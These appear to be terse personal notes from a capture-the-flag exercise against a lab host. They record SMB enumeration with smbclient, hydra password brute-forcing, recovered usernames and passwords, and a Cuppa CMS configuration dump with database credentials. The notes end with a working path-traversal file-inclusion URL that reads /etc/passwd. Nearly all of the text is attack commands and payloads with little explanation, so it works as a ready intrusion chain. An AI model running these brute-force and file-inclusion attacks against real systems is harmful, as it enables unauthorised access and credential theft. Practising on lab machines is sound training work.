445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)


smbclient -L //10.113.130.138 -N
(lists clients)

http://10.113.130.138/squirrelmail/src/login.php


hydra -l [username] -P [your_password_list.txt] [target_ip] smb -V -f

hydra -l skynet -P Downloads/skynet.txt [target_ip] smb -V -f

works http://10.113.130.138/squirrelmail/
CVE 2025 30090


milesdyson
cyborg007haloterminator

smbclient //10.113.130.138/milesdyson -U milesdyson --option="client min protocol=NT1"
)s{A&2Z=F^n_E.B`

smbclient //10.113.130.138/milesdyson -N -c 'get notes/important.txt -' | cat

secret folder : 45kra24zxs28v3yd

)s{A&2Z=F^n_E.B`

C:\home\milesdyson\share

\\10.113.130.138\milesdyson

http://10.113.130.138/45kra24zxs28v3yd/administrator/


wget -r -np -nH --cut-dirs=2 -R "index.html*" "http://10.113.130.138/45kra24zxs28v3yd/administrator/"

https://www.exploit-db.com/exploits/25971
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
?>


http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd


milesdyson
cyborg007haloterminator

on shell also